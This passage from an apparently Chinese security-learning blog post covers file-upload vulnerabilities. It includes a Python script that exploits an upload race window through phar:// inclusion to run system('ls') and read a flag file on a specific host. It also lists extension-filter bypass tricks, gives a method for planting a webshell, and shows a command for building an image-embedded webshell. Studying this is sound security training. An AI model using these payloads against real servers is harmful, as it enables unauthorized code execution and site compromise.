                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    <span class="token variable">$im</span> <span class="token operator">=</span> @<span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$im</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                      <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token variable">$bg</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token variable">$text_color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token function">imagefilledrectangle</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token variable">$bg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token function">imagestring</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"Error loading image"</span><span class="token punctuation">,</span> <span class="token variable">$text_color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$new_rootpath</span><span class="token operator">=</span><span class="token single-quoted-string string">'uploads/'</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span>
                        <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$new_rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    <span class="token variable">$im</span> <span class="token operator">=</span> @<span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$im</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                      <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token variable">$bg</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token variable">$text_color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token function">imagefilledrectangle</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token variable">$bg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token function">imagestring</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"Error loading image"</span><span class="token punctuation">,</span> <span class="token variable">$text_color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$new_rootpath</span><span class="token operator">=</span><span class="token single-quoted-string string">'uploads/'</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">.</span><span class="token variable">$name1</span><span class="token punctuation">;</span>
                        <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$new_rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$rootpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"图片ID："</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"ERROR"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//</span>
 <span class="token delimiter important">?></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>首先是验证上传的文件是否为图片格式，如果上传了正确的图片，imagecreatefromjpeg()返回图像资源，文件名更换为新的时间戳，用新的文件路径newrootpath 输 出 图 片 ， 最 后 删 除 原文件unlink(new_rootpath)输出图片，最后删除原文件unlink;如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件unlink($rootpath);上传过程中存在一个延时函数sleep(5)，所以上传的文件即使验证不成功也有5秒钟的时间存在。</p>
<p>python的payload。</p>
<pre class="language-py" data-language="py"><code class="language-py"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
data0<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'v'</span><span class="token punctuation">:</span><span class="token string">"phpinfo();"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>
data1<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'v'</span><span class="token punctuation">:</span><span class="token string">"system('ls');"</span>
<span class="token punctuation">&#125;</span>
data2<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'v'</span><span class="token punctuation">:</span><span class="token string">"system('cat xxxxxxxxxasdasf_flag.php');"</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">'http://202.112.51.184:9005/index.php?page=phar://./uploads/'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg/v'</span>
        t<span class="token operator">=</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span><span class="token punctuation">.</span>content
        <span class="token keyword">print</span> i
        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> t<span class="token punctuation">:</span>
            <span class="token keyword">print</span> t
            <span class="token keyword">break</span></code></pre>
<h2 id="其它方式—绕过"><a href="#其它方式—绕过" class="headerlink" title="其它方式—绕过"></a>其它方式—绕过</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>部分程序员的思维不严谨，并使用逻辑不完善的上传文件合法性检测手段，导致可以找到方式绕过其检测方式。</p>
<h3 id="绕过方法-7"><a href="#绕过方法-7" class="headerlink" title="绕过方法"></a>绕过方法</h3><pre class="language-txt" data-language="txt"><code class="language-txt">1. 后缀名大小写绕过 用于只将小写的脚本后缀名(如php)过滤掉的场合； 
例如:将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】

2. 双写后缀名绕过 用于只将文件后缀名过滤掉的场合，例如&quot;php&quot;字符串过滤的； 
例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个&quot;php&quot;字符串&quot;后，
开头的’p’和结尾的’hp’就组合又形成了【php】。

3. 特殊后缀名绕过 用于检测文件合法性的脚本有问题的场合； 
例如:将Burpsuite截获的数据包中【evil.php】名字改为【evil.php6】，或加个空格改为【evil.php 】等。</code></pre>

<h1 id="常见web-server组合"><a href="#常见web-server组合" class="headerlink" title="常见web server组合"></a>常见web server组合</h1><pre class="language-bash" data-language="bash"><code class="language-bash">x.asp

windows server + asp + access  +  IIS

x.aspx
windows server + aspx + sql server  +  IIS

x.php
Linux  + apache + php  + mysql 

linux +  ngix  + php  + mysql 

x.jsp  x.jspx

Linux + apache tomcat  + jsp +  mysql/sql server/oracle

windows server  + apache tomcat  + jsp +  mysql/sql server/oracle</code></pre>



<h1 id="文件上传检测流程"><a href="#文件上传检测流程" class="headerlink" title="文件上传检测流程"></a>文件上传检测流程</h1><h2 id="脑图-【by-zksmile】"><a href="#脑图-【by-zksmile】" class="headerlink" title="脑图 【by zksmile】"></a>脑图 【by zksmile】</h2><p><img src="image005.png" loading="lazy"></p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
<li><p>寻找上传点网站前台的上传点一般有头像上传、附件上传、证件认证上传。如果通过SQL注入或者其它一些技术手段得到网站后台权限,一般在网站更新页面的地方会存在上传点。也可以通过敏感目录或文件扫描工具扫到一些开源编辑器的测试上传页面等等。</p>
</li>
<li><p>找到上传点之后,先上传一张正常的图片测试该上传点时候可用。</p>
</li>
<li><p>上传一张正常的图片,抓包修改文件后缀名为对应网站脚本语言。<br>该操作可以绕过前端检测、MIME检测、文件内容检测,可以检测出网站是否对上传文件进行了文件后缀名的检测。<br>如果上传成功表示没有对文件后缀进行检测,可以进一步上传图片马,抓包修改文件后缀为对应网站脚本语言即可获取webshell.<br>如果上传失败表示对文件名后缀进行了检测,需要进一步判断是黑名单检测还是白名单检测。</p>
</li>
<li><p>上传一张正常的图片,在它后缀随便添加几个字符进行上传。<br>eg: “1jpgaaaaa”该后缀的文件既不在黑名单之内也不在白名单之内,如果文件上传成功代表是黑名单检测,如果上传失败代表是白名单检测。</p>
</li>
<li><p>黑名单检测绕过</p>
<ul>
<li>文件名大小写绕过</li>
<li>特殊文件名绕过<br>  后缀加上：<ul>
<li>::$DATA（目标环境在Windows下）</li>
<li>空格和点(.)，或空格和点的组合（目标环境在Windows下）<br>碰到过滤文件名的</li>
<li>双写文件名pphphp</li>
</ul>
</li>
<li>0x00截断绕过</li>
<li>.htaccess文件攻击</li>
<li>php文件包含漏洞</li>
<li>Apache解析漏洞</li>
<li>Nginx解析漏洞</li>
</ul>
</li>
<li><p>白名单检测绕过</p>
<ul>
<li>0x00截断绕过</li>
<li>是否暴露保存路径，保存路径截断，或修改</li>
<li>php文件包含漏洞</li>
<li>IIS解析漏洞</li>
<li>Nginx解析漏洞</li>
</ul>
</li>
</ol>
<p>00截断的条件(过气了)</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">1.  php版本小于5.3.4
2.  php的magic\_quotes\_gpc为OFF状态</code></pre>

<p>图片马制作</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">copy <span class="token number">1</span>.png/b + payload.* <span class="token number">2</span>.png

/A           表示 ASCII 文本文件。
/B           表示二进制文件。</code></pre>

</font></div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">请我喝茶( ^‐^)_且~~</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="images/reward.jpg"><img loading="lazy" src="/images/reward.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>1asy</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="web漏洞学习-文件上传">https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/01/12/Python-converts-pictures-into-character-drawings/" rel="next" title="Python converts pictures into character drawings"><span class="post-nav-text">Python converts pictures into character drawings</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>点击按钮跳转 GitHub Issues 评论。</span><br><span>若没有本文 Issue，您可以使用 Comment 模版新建。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/YunYouJun/yunyoujun.github.io/issues?q=is:issue+web漏洞学习-文件上传">GitHub Issues</a></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> 1asy</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">ヾ(=･ω･=)o</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-11-16T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>